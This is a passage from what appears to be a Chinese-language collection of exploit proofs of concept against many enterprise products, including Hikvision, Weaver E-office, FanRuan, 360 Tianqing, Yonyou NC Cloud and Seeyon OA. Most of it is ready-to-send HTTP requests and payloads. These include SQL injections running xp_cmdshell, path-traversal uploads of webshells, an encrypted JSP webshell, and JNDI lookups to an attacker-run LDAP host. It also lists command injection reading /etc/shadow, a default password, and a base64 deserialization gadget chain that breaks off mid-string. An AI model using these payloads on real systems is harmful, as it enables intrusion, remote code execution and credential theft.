Connection: close

<?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY '00:00:03';-</name><name>1</name><name>102360</name></root>

命令执行：
exec master..xp_cmdshell 'whoami';
```

### HiKVISION综合安放管理平台report任意文件上传

```

POST /svm/api/external/report HTTP/1.1
Host: xxxxx
Content-Length: 2849
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../tomcat85linux64.1/webapps/els/static/111.jsp"
Content-Type: application/zip

xxxxx(优先建议哥斯拉base64)
------WebKitFormBoundary9PggsiM755PLa54a--



GET /els/static/test.jsp HTTP/1.1
```

### HiKVISION综合安放管理平台files任意文件上传

```
POST /center/api/files;.html HTTP/1.1
Host: 10.10.10.10
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip

<%jsp的马┈%>
------WebKitFormBoundary9PggsiM755PLa54a--
```

### 辰信景云终端安全管理系统login SQL注入

```
POST /api/user/login

captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(3))a)='
```

### 泛微E-office9文件上传漏洞CVE-2023-2648

```
POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: 192.168.233.10:8082
User-Agent: test
Connection: close
Content-Length: 493
Accept-Encoding: gzip
Content-Type: multipart/form-data

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="Filedata"; filename="666.php"
Content-Type: application/octet-stream

<?php phpinfo();?>

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
```

### 帆软任意文件覆盖

版本：/tomcat-7.0.96/webapps/ROOT/index.jsp

覆盖 Tomcat 自带 ROOT 目录下的 index.jsp:

```

POST /WebReport/ReportServer?
op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp HTTP/1.1
Host: 192.168.169.138:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/81.0.4044.92 Safari/537.36
Connection: close
Accept-Au: 0c42b2f264071be0507acea1876c74
Content-Type: text/xml;charset=UTF-8
Content-Length: 675
{"__CONTENT__":"<%@pageimport=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!classU extends
ClassLoader{U(ClassLoader c){super(c);}public Classg(byte []b){return
super.defineClass(b,0,b.length);}}%><%if(request.getParameter(\"pass\")!=null){String
k=(\"\"+UUID.randomUUID()).replace(\"-
\",\"\").substring(16);session.putValue(\"u\",k);out.print(k);return;}Cipher
c=Cipher.getInstance(\"AES\");c.init(2,new
SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));new
U(this.getClass().getClassLoader()).g(c.doFinal(new
sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInsta
nce().equals(pageContext);%>","__CHARSET__":"UTF-8"}
```

### 天擎前台sql注入漏洞

```
https://xxx.xxx.xxx.xxx:8443/api/dp/rptsvcsyncpoint?ccid=1';create  table O(T TEXT);insert into O(T) values('<?php  @eval($_POST[1]);?>');copy O(T) to 'C:\Program Files  (x86)\360\skylar6\www\1.php';drop table O;--
```

### Adobe ColdFusion反序列化漏洞

```
POST /CFIDE/adminapi/base.cfc?method= HTTP/1.1
Host: 1.2.3.4:1234
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 400
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
cmd: id

argumentCollection=
<wddxPacket version='1.0'>
    <header/>
    <data>
        <struct type='xcom.sun.rowset.JdbcRowSetImplx'>
            <var name='dataSourceName'>
                <string>ldap://xxx.xxx.xxx:1234/Basic/TomcatEcho</string>
            </var>
            <var name='autoCommit'>
                <boolean value='true'/>
            </var>
        </struct>
    </data>
</wddxPacket>
```

### Coremail邮件系统未授权访问获得管理员账密

```
/coremail/common/assets/;l;/;/;/;/;/s?biz=Mzl3MTk4NTcyNw==&mid=2247485877&idx=1&sn=7e5f77db320ccf9013c0b7aa72626e68&chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688bf6adaed61&scene=2
```

### Eramba任意代码执行漏洞

```
nterprise and Community edition <= 3.19.1

GET /settings/download-test-pdf?path=ip%20a; HTTP/1.1
Host: [redacted]
Cookie: translation=1; csrfToken=1l2rXXwj1D1hVyVRH%2B1g%2BzIzYTA3OGFiNWRjZWVmODQ1OTU1NWEyODM2MzIwZTZkZTVlNmU1YjY%3D; PHPSESSID=14j6sfroe6t2g1mh71g2a1vjg8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://[redacted]/settings
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

HTTP/1.1 500 Internal Server Error
Date: Fri, 31 Mar 2023 12:37:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Access-Control-Allow-Origin: *
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Disposition: attachment; filename="test.pdf"
X-DEBUGKIT-ID: d383f6d4-6680-4db0-b574-fe789abc1718
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 2033469

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8"/> <meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>
Error: The exit status code '127' says something went wrong:
stderr: &quot;sh: 1: --dpi: not found
&quot;
stdout: &quot;1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether [redacted] brd ff:ff:ff:ff:ff:ff
    inet [redacted] brd [redacted] scope global ens33
       valid_lft forever preferred_lft forever
    inet6 [redacted] scope link
       valid_lft forever preferred_lft forever
&quot;
command: ip a; --dpi '90' --lowquality --margin-bottom '0' --margin-left '0'
--margin-right '0' --margin-top '0' --orientation 'Landscape'
--javascript-delay '1000' '/tmp/knp_snappy6426d4231040e1.91046751.html'
'/tmp/knp_snappy6426d423104587.46971034.pdf'. </title>

[...]
```

### gitlab路径遍历读取任意文件

```
可能需要登录
GET /group1/group2/group3/group4/group5/group6/group7/group8/group9/project9/uploads/4e02c376ac758e162ec674399741e38d//..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

### 任我行CRM SmsDataList SQL注入漏洞

```
详情可参考原文 有复现截图
原文链接：https://mp.weixin.qq.com/s/01uVhwihuwIvpAIrJT4SyQ

任我行 CRM SmsDataList 接口处存在SQL注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。

POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.1361.63 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 170

Keywords=&StartSendDate=2023-07-17&EndSendDate=2023-08-10&SenderTypeId=0000000000*

SenderTypeId参数存在注入，可在SenderTypeId参数值0000000000后自行闭合注入，也可将数据包直接放入sqlmap进行验证
```

### GDidees CMS任意文件上传

```
0x01 影响版本

GDidees CMS 3.9.1及以下。
0x02 漏洞复现
创建文件格式为phar的一句话木马文件。

访问Roxy Fileman插件页面。

上传木马

此时我们发现，携带参数cmd=echo ‘csx lab’;访问cmd.phar页面，可以看到php代码成功执行。证明漏洞存在。


修复意见：
修改conf.json文件中的FORBIDDEN_UPLOADS字段，禁止上传phar格式的文件。
```

### GitLab路径遍历

```
可能需要登录
GET /group1/group2/group3/group4/group5/group6/group7/group8/group9/project9/uploads/4e02c376ac758e162ec674399741e38d//..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

### Kuboard默认口令

```
漏洞描述：
Kuboard，是一款免费的 Kubernetes 图形化管理工具，Kuboard 力图帮助用户快速在 Kubernetes 上落地微服务。Kuboard存在默认口令可以通过默认口令登录Kuboard，管理Kubernetes。
admin/kuboard123
```

### Panabit iXCache网关RCE漏洞（CVE-2023-38646）

```
POST /cgi-bin/Maintain/date_config HTTP/1.1
主机：127.0.0.1：8443
Cookie:暂停器_9667402_260=paonline管理员_44432_9663；暂停器_9661348_661=在线管理_61912_96631
用户代理:Mozilla/5.0（视窗NT 10.0；Win64；x64；rv:104.0）火狐浏览器/104.0
内容类型：应用程序/X-www格式的url coded
内容长度：107

ntpserver=0.0.0.0%3Bwhoami&year=2000&month=08&day=15&hour=11&minute=34&second=53&ifname=fxp1
```

### 安恒蜜罐2.0.11提权漏洞

```go
package passwd

import (
 "crypto/sha256"
 "fmt"
 "time"
)

func Main() {

 timestamp := time.Now().Unix()
 date := time.Unix(timestamp, 0).Format("2006-01-02")

 XXX1 := "1234567890!@#$%^&*()" + date + "root"
 XXXX1 := sha256.Sum256([]byte(XXX1))
 XXXXX1 := fmt.Sprintf("%x", XXXX1)[:16]
 VVV1 := "1234567890!@#$%^&*()" + date + "operator"
 VVVV1 := sha256.Sum256([]byte(VVV1))
 VVVVV1 := fmt.Sprintf("%x", VVVV1)[:16]
 println(fmt.Sprintf("[+] root     passwd ->  %s", XXXXX1))
 println(fmt.Sprintf("[+] operator passwd ->  %s", VVVVV1))

}
```

### 傲盾信息安全管理系统命令执行漏洞

```
漏洞描述：信息安全管理系统(SMS) 是IDC/ISP业务经营者建设的具有基础数据管理、访问日志管理、信息安全管理等功能的信息安全管理系统，该漏洞可未授权的情况下直接执行任意命令
相关信息：
/user_management/sichuan_login
请求体：
loginname=sysadmin&ticket=
```

### 赛斯 SuccezBI前台任意文件上传

```
POST /succezbi/sz/commons/form/file/uploadChunkFile?guid=../tomcat/webapps/ROOT/&chunk=ss.jsp HTTP/1.1
Host: 10.168.4.99:808
Content-Length: 49564
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8GeAY18LCxR7XnVP
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8, application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN, zh;q=0.9
Cookie: JSESSIONID=7351EFC189410384FF702A41106FF4A2
Connection: close

------WebKitFormBoundary8GeAY18LCxR7XnVP
Content-Disposition: form-data; name="file"; filename="www"
Content-Type: image/jpeg

webshell

------WebKitFormBoundary8GeAY18LCxR7XnVP
Content-Disposition: form-data; name="xxx"

confirm
------WebKitFormBoundary8GeAY18LCxR7XnVP--
```

### Hytec Inter HWL-2511-SS popen.cgi命令注入漏洞

```
title="index" && header="lighttpd/1.4.30"

/cgi-bin/popen.cgi?command=ping%20-c%204%201.1.1.1;cat%20/etc/shadow&v=0.1303033443137921
```

### 泛微E-Office-upload文件上传漏洞

```
poc来自：https://mp.weixin.qq.com/s/kgEec5abI13lmgh4rtH6Qw


POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
Connection: close
Content-Length: 259
Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
Accept-Encoding: gzip

--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; name="Filedata"; filename="2TrZmO0y0SU34qUcUGHA8EXiDgN.php"
Content-Type: image/jpeg


<?php echo "2TrZmO0y0SU34qUcUGHA8EXiDgN";unlink(__FILE__);?>


--e64bdf16c554bbc109cecef6451c26a4--



上传文件所在路径：
/attachment/3466744850/xxx.php
```

### 飞企互联FE业务协作平台imagePath文件读取漏洞

```
漏洞描述：
FE 办公协作平台是实现应用开发、运行、管理、维护的信息管理平台。飞企互联 FE 业务协作平台存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件获取大量敏感信息。
漏洞影响 ： 飞企互联 FE业务协作平台 
 网络测绘：
“flyrise.stopBackspace.js”

验证POC
/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print
```

### 明源云ERP ApiUpdate.ashx文件上传漏洞

```
POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1
Host: target.com
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 856

{{unquote("PK\x03\x04\x14\x00\x00\x00\x08\x00\xf2\x9a\x0bW\x97\xe9\x8br\x8c\x00\x00\x00\x93\x00\x00\x00\x1e\x00\x00\x00../../../fdccloud/_/check.aspx$\xcc\xcb\x0a\xc20\x14\x04\xd0_\x09\x91B\xbb\x09\x0a\xddH\xab\x29\x8aP\xf0QZ\xc4\xf5m\x18j!ib\x1e\x82\x7fo\xc4\xdd0g\x98:\xdb\xb1\x96F\xb03\xcdcLa\xc3\x0f\x0b\xce\xb2m\x9d\xa0\xd1\xd6\xb8\xc0\xae\xa4\xe1-\xc9d\xfd\xc7\x07h\xd1\xdc\xfe\x13\xd6%0\xb3\x87x\xb8\x28\xe7R\x96\xcbr5\xacyQ\x9d&\x05q\x84B\xea\x7b\xb87\x9c\xb8\x90m\x28<\xf3\x0e\xaf\x08\x1f\xc4\xdd\x28\xb1\x1f\xbcQ1\xe0\x07EQ\xa5\xdb/\x00\x00\x00\xff\xff\x03\x00PK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00\xf2\x9a\x0bW\x97\xe9\x8br\x8c\x00\x00\x00\x93\x00\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00../../../fdccloud/_/check.aspxPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00L\x00\x00\x00\xc8\x00\x00\x00\x00\x00")}}
```

### 用友NC Cloud jsinvoke任意文件上传漏洞

```
漏洞描述
用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限
app="用友-NC-Cloud"


POST /uapjs/jsinvoke/?action=invoke
Content-Type: application/json

{
  "serviceName": "nc.itf.iufo.IBaseSPService",
  "methodName": "saveXStreamConfig",
  "parameterTypes": [
    "java.lang.Object",
    "java.lang.String"
  ],
  "parameters": [
    "${param.getClass().forName(param.error).newInstance().eval(param.cmd)}",
    "webapps/nc_web/407.jsp"
  ]
}





POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host:
Connection: Keep-Alive
Content-Length: 253
Content-Type: application/x-www-form-urlencoded

{
  "serviceName": "nc.itf.iufo.IBaseSPService",
  "methodName": "saveXStreamConfig",
  "parameterTypes": [
    "java.lang.Object",
    "java.lang.String"
  ],
  "parameters": [
    "${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://VPSip:1389/TomcatBypass/TomcatEcho')}",
    "webapps/nc_web/301.jsp"
  ]
}
```

### 致远OA-M1Server命令执行

```
id: M1Server-rce



info:

  name: M1Server-rce

  author: hufei

  severity: critical

  description: |

    致远OA M1Server userTokenService 接口存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限

  reference:

    https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E8%87%B4%E8%BF%9COA/

  metadata:

    max-request: 3

    fofa-query: "M1-Server 已启动"

    hunter-query:

    verified: true

  tags: 2023,HVV,M1Server,rce,intrusive



http:

  - raw:

      - |

        POST /esn_mobile_pns/service/userTokenService HTTP/1.1

        Host: {{Hostname}}

        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

        Content-Type: application/x-www-form-urlencoded

        Accept-Encoding: gzip, deflate

        Connection: close

        cmd: @@@@@echo Test



        {{base64_decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyACBqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlcgAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAHQAC25ld0luc3RhbmNldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAc3EAfgATdXEAfgAYAAAAAXQAAmpzdAAPZ2V0RW5naW5lQnlOYW1ldXEAfgAbAAAAAXZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHNxAH4AE3VxAH4AGAAAAAF0LWx0cnkgewogIGxvYWQoIm5hc2hvcm46bW96aWxsYV9jb21wYXQuanMiKTsKfSBjYXRjaCAoZSkge30KZnVuY3Rpb24gZ2V0VW5zYWZlKCl7CiAgdmFyIHRoZVVuc2FmZU1ldGhvZCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5VbnNhZmUiKS5nZXREZWNsYXJlZEZpZWxkKCd0aGVVbnNhZmUnKTsKICB0aGVVbnNhZmVNZXRob2Quc2V0QWNjZXNzaWJsZSh0cnVlKTsgCiAgcmV0dXJuIHRoZVVuc2FmZU1ldGhvZC5nZXQobnVsbCk7Cn0KZnVuY3Rpb24gcmVtb3ZlQ2xhc3NDYWNoZShjbGF6eil7CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpOwogIHZhciBjbGF6ekFub255bW91c0NsYXNzID0gdW5zYWZlLmRlZmluZUFub255bW91c0NsYXNzKGNsYXp6LGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLmxhbmcuQ2xhc3MiKS5nZXRSZXNvdXJjZUFzU3RyZWFtKCJDbGFzcy5jbGFzcyIpLnJlYWRBbGxCeXRlcygpLG51bGwpOwogIHZhciByZWZsZWN0aW9uRGF0YUZpZWxkID0gY2xhenpBbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJyZWZsZWN0aW9uRGF0YSIpOwogIHVuc2FmZS5wdXRPYmplY3QoY2xhenosdW5zYWZlLm9iamVjdEZpZWxkT2Zmc2V0KHJlZmxlY3Rpb25EYXRhRmllbGQpLG51bGwpOwp9CmZ1bmN0aW9uIGJ5cGFzc1JlZmxlY3Rpb25GaWx0ZXIoKSB7CiAgdmFyIHJlZmxlY3Rpb25DbGFzczsKICB0cnkgewogICAgcmVmbGVjdGlvbkNsYXNzID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImpkay5pbnRlcm5hbC5yZWZsZWN0LlJlZmxlY3Rpb24iKTsKICB9IGNhdGNoIChlcnJvcikgewogICAgcmVmbGVjdGlvbkNsYXNzID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoInN1bi5yZWZsZWN0LlJlZmxlY3Rpb24iKTsKICB9CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpOwogIHZhciBjbGFzc0J1ZmZlciA9IHJlZmxlY3Rpb25DbGFzcy5nZXRSZXNvdXJjZUFzU3RyZWFtKCJSZWZsZWN0aW9uLmNsYXNzIikucmVhZEFsbEJ5dGVzKCk7CiAgdmFyIHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcyA9IHVuc2FmZS5kZWZpbmVBbm9ueW1vdXNDbGFzcyhyZWZsZWN0aW9uQ2xhc3MsIGNsYXNzQnVmZmVyLCBudWxsKTsKICB2YXIgZmllbGRGaWx0ZXJNYXBGaWVsZCA9IHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJmaWVsZEZpbHRlck1hcCIpOwogIHZhciBtZXRob2RGaWx0ZXJNYXBGaWVsZCA9IHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJtZXRob2RGaWx0ZXJNYXAiKTsKICBpZiAoZmllbGRGaWx0ZXJNYXBGaWVsZC5nZXRUeXBlKCkuaXNBc3NpZ25hYmxlRnJvbShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKSkpIHsKICAgIHVuc2FmZS5wdXRPYmplY3QocmVmbGVjdGlvbkNsYXNzLCB1bnNhZmUuc3RhdGljRmllbGRPZmZzZXQoZmllbGRGaWx0ZXJNYXBGaWVsZCksIGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuSGFzaE1hcCIpLmdldENvbnN0cnVjdG9yKCkubmV3SW5zdGFuY2UoKSk7CiAgfQogIGlmIChtZXRob2RGaWx0ZXJNYXBGaWVsZC5nZXRUeXBlKCkuaXNBc3NpZ25hYmxlRnJvbShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKSkpIHsKICAgIHVuc2FmZS5wdXRPYmplY3QocmVmbGVjdGlvbkNsYXNzLCB1bnNhZmUuc3RhdGljRmllbGRPZmZzZXQobWV0aG9kRmlsdGVyTWFwRmllbGQpLCBqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKS5nZXRDb25zdHJ1Y3RvcigpLm5ld0luc3RhbmNlKCkpOwogIH0KICByZW1vdmVDbGFzc0NhY2hlKGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLmxhbmcuQ2xhc3MiKSk7Cn0KZnVuY3Rpb24gc2V0QWNjZXNzaWJsZShhY2Nlc3NpYmxlT2JqZWN0KXsKICAgIHZhciB1bnNhZmUgPSBnZXRVbnNhZmUoKTsKICAgIHZhciBvdmVycmlkZUZpZWxkID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImphdmEubGFuZy5yZWZsZWN0LkFjY2Vzc2libGVPYmplY3QiKS5nZXREZWNsYXJlZEZpZWxkKCJvdmVycmlkZSIpOwogICAgdmFyIG9mZnNldCA9IHVuc2FmZS5vYmplY3RGaWVsZE9mZnNldChvdmVycmlkZUZpZWxkKTsKICAgIHVuc2FmZS5wdXRCb29sZWFuKGFjY2Vzc2libGVPYmplY3QsIG9mZnNldCwgdHJ1ZSk7Cn0KZnVuY3Rpb24gZGVmaW5lQ2xhc3MoYnl0ZXMpewogIHZhciBjbHogPSBudWxsOwogIHZhciB2ZXJzaW9uID0gamF2YS5sYW5nLlN5c3RlbS5nZXRQcm9wZXJ0eSgiamF2YS52ZXJzaW9uIik7CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpCiAgdmFyIGNsYXNzTG9hZGVyID0gbmV3IGphdmEubmV0LlVSTENsYXNzTG9hZGVyKGphdmEubGFuZy5yZWZsZWN0LkFycmF5Lm5ld0luc3RhbmNlKGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLm5ldC5VUkwiKSwgMCkpOwogIHRyeXsKICAgIGlmICh2ZXJzaW9uLnNwbGl0KCIuIilbMF0gPj0gMTEpIHsKICAgICAgYnlwYXNzUmVmbGVjdGlvbkZpbHRlcigpOwogICAgZGVmaW5lQ2xhc3NNZXRob2QgPSBqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS5sYW5nLkNsYXNzTG9hZGVyIikuZ2V0RGVjbGFyZWRNZXRob2QoImRlZmluZUNsYXNzIiwgamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoIltCIiksamF2YS5sYW5nLkludGVnZXIuVFlQRSwgamF2YS5sYW5nLkludGVnZXIuVFlQRSk7CiAgICBzZXRBY2Nlc3NpYmxlKGRlZmluZUNsYXNzTWV0aG9kKTsKICAgIC8vIOe7lei/hyBzZXRBY2Nlc3NpYmxlIAogICAgY2x6ID0gZGVmaW5lQ2xhc3NNZXRob2QuaW52b2tlKGNsYXNzTG9hZGVyLCBieXRlcywgMCwgYnl0ZXMubGVuZ3RoKTsKICAgIH1lbHNlewogICAgICB2YXIgcHJvdGVjdGlvbkRvbWFpbiA9IG5ldyBqYXZhLnNlY3VyaXR5LlByb3RlY3Rpb25Eb21haW4obmV3IGphdmEuc2VjdXJpdHkuQ29kZVNvdXJjZShudWxsLCBqYXZhLmxhbmcucmVmbGVjdC5BcnJheS5uZXdJbnN0YW5jZShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS5zZWN1cml0eS5jZXJ0LkNlcnRpZmljYXRlIiksIDApKSwgbnVsbCwgY2xhc3NMb2FkZXIsIFtdKTsKICAgICAgY2x6ID0gdW5zYWZlLmRlZmluZUNsYXNzKG51bGwsIGJ5dGVzLCAwLCBieXRlcy5sZW5ndGgsIGNsYXNzTG9hZGVyLCBwcm90ZWN0aW9uRG9tYWluKTsKICAgIH0KICB9Y2F0Y2goZXJyb3IpewogICAgZXJyb3IucHJpbnRTdGFja1RyYWNlKCk7CiAgfWZpbmFsbHl7CiAgICByZXR1cm4gY2x6OwogIH0KfQpmdW5jdGlvbiBiYXNlNjREZWNvZGVUb0J5dGUoc3RyKSB7CiAgdmFyIGJ0OwogIHRyeSB7CiAgICBidCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5CQVNFNjREZWNvZGVyIikubmV3SW5zdGFuY2UoKS5kZWNvZGVCdWZmZXIoc3RyKTsKICB9IGNhdGNoIChlKSB7CiAgICBidCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0IikubmV3SW5zdGFuY2UoKS5nZXREZWNvZGVyKCkuZGVjb2RlKHN0cik7CiAgfQogIHJldHVybiBidDsKfQp2YXIgY29kZT0ieXY2NnZnQUFBQzhCWndvQUlBQ1NCd0NUQndDVUNnQUNBSlVLQUFNQWxnb0FJ